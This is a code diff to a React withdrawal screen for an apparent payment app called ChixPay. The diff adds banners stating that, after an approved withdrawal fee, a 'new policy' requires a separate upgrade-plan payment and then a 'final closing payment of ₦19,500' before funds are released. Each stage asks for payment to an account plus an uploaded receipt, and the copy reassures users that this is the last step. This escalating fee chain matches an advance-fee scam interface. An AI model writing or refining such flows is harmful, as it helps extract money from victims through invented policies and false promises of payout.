@@ -286,7 +286,12 @@ export function WithdrawFlow({ onBack, onNeedKey, onSuccess, balance, defaultNam
           "New policy · withdrawal fee")}
 
         {!pending && stage === "upgrade" && <div className="auth-enter mt-5 space-y-3">
-          <p className="text-xs leading-5 text-muted-foreground">{rejected ? "Choose your upgrade plan again, pay and upload a valid receipt to continue." : "Your withdrawal fee was approved. Choose an upgrade plan to unlock your payout, then pay and upload your receipt."}</p>
+          <div className="rounded-[26px] border border-gold/30 bg-gold/10 p-4">
+            <div className="flex items-center gap-2 text-gold"><ShieldAlert className="size-4"/><p className="text-[10px] font-semibold uppercase tracking-[0.14em]">New ChixPay policy</p></div>
+            <p className="mt-2 text-xs leading-5 font-semibold">Your withdrawal fee was approved ✅</p>
+            <p className="mt-2 text-[11px] leading-5 text-muted-foreground">Under the new ChixPay policy, every withdrawal must be attached to an <strong className="text-foreground">upgrade plan</strong> before it can be released. This upgrade payment is <strong className="text-foreground">required and separate</strong> from the fee you already paid — your withdrawal stays on hold until it is approved. Choose a plan below, pay to the account shown, and upload your receipt.</p>
+          </div>
+          {rejected && <p className="text-xs leading-5 text-muted-foreground">Your previous upgrade receipt was rejected. Choose your plan again, pay and upload a valid receipt to continue.</p>}
           {upgradePlans.map((item) => (
             <button key={item.name} onClick={() => { setPlan(item); setNotice(""); }} className={`w-full rounded-[24px] border p-4 text-left backdrop-blur-xl transition ${plan?.name === item.name ? "border-leaf/60 bg-leaf/10" : "border-glass-border bg-glass hover:border-leaf/40"}`}>
               <div className="flex items-start justify-between">
@@ -299,10 +304,17 @@ export function WithdrawFlow({ onBack, onNeedKey, onSuccess, balance, defaultNam
           {plan && paymentCard("Pay your upgrade to", `You selected the ${plan.name} plan. Pay ₦${plan.amount.toLocaleString()} to the account below and upload your receipt for approval.`, "Upgrade payment")}
         </div>}
 
-        {!pending && stage === "final" && paymentCard(
-          "Pay the final payment to",
-          "Final payment: a closing policy payment of ₦19,500 releases your money to your bank account. Pay to the account below and upload your receipt.",
-          "Final payment")}
+        {!pending && stage === "final" && <>
+          <div className="auth-enter mt-5 rounded-[26px] border border-gold/30 bg-gold/10 p-4">
+            <div className="flex items-center gap-2 text-gold"><ShieldAlert className="size-4"/><p className="text-[10px] font-semibold uppercase tracking-[0.14em]">New ChixPay policy</p></div>
+            <p className="mt-2 text-xs leading-5 font-semibold">Your upgrade payment was approved ✅</p>
+            <p className="mt-2 text-[11px] leading-5 text-muted-foreground">One last step: the new policy requires a <strong className="text-foreground">final closing payment of ₦19,500</strong> to release your money to your bank account. This is the <strong className="text-foreground">last payment</strong> — once it is approved, your withdrawal is sent immediately. Pay to the account below and upload your receipt.</p>
+          </div>
+          {paymentCard(
+            "Pay the final payment to",
+            "This final closing payment of ₦19,500 is the last step. Once approved, your money is released straight to your bank account.",
+            "Final payment · last step")}
+        </>}
       </>}
 
       {!booting && step === "policy" && !active && <div className="auth-enter relative mt-6 overflow-hidden rounded-[28px] border border-leaf/30 bg-glass p-6 text-center backdrop-blur-2xl">
